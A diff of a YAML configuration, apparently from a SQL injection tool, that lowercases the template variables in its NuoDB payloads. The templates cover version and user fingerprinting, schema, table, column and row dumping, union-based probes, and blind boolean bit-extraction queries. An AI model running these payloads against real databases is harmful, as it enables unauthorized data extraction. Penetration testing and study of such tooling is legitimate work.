@@ -3,11 +3,11 @@ resource:
  info: |
   select
       GETRELEASEVERSION() 
-      || '${ENCLOSE_VALUE_SQL}' 
+      || '${enclose_value_sql}' 
       || database() 
-      || '${ENCLOSE_VALUE_SQL}' 
+      || '${enclose_value_sql}' 
       || current_user() 
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
       r
   from dual
   
@@ -15,96 +15,96 @@ resource:
   database: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || t.s
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from (
            select distinct schema s
            from system.schemas
        ) t
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || t.s
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from (
            select distinct tablename s
            from system.tables
-           where schema = '${DATABASE}'
+           where schema = '${database}'
        ) t
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || t.s
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from (
            select distinct field s
            from system.indexfields
-           where schema = '${DATABASE}'
-           and tablename = '${TABLE}'
+           where schema = '${database}'
+           and tablename = '${table}'
        ) t
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        || '${TRAIL_SQL}'
+        || '${trail_sql}'
         r
     from (
         select 
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             || s
-            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            || '${separator_qte_sql}0${enclose_value_sql}'
             rr
         from (
-            select distinct ${FIELDS} s 
-            from ${DATABASE}.${TABLE}
+            select distinct ${fields} s 
+            from ${database}.${table}
         ) t
-        {limit}
+        ${limit}
     ) a
    fields: 
-    field: ${FIELD}
+    field: ${field}
     concat: "|| '%7f' ||"
     
 strategy: 
  configuration: 
   slidingWindow: |
    select 
-       '${LEAD}' 
+       '${lead}' 
        || substr(
            r, 
-           ${INDEX},
-           ${CAPACITY}
+           ${index},
+           ${capacity}
        ) r
-   from (${INJECTION})x
-  limit: limit ${LIMIT}, 1
-  failsafe: select '' || (1337${INDICE}7330%2b1) r from dual
-  calibrator: replicate('${CALIBRATOR_SQL}', 65536)
+   from (${injection})x
+  limit: limit ${limit.value}, 1
+  failsafe: select '' || (1337${indice}7330%2b1) r from dual
+  calibrator: replicate('${calibrator_sql}', 65536)
   limitBoundary: 0
   endingComment: --+-
   fingerprint: 
@@ -112,8 +112,8 @@ strategy:
     - nuodb
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)
+  indices: union select ${result_range} from (${indice_unique})
+  capacity: (select '${lead}${indice}' || ${calibrator} from dual)
   orderBy: order by 1337
   
  boolean: 
@@ -136,13 +136,13 @@ strategy:
    bit: |
     0 != (unicode(
         substr(
-            (${INJECTION}), 
-            ${INDEX}, 
+            (${injection}), 
+            ${index}, 
             1
         )
     ) 
-    %26 ${BIT})
-   length: char_length((${INJECTION})) > ${INDEX}
+    %26 ${bit})
+   length: char_length((${injection})) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
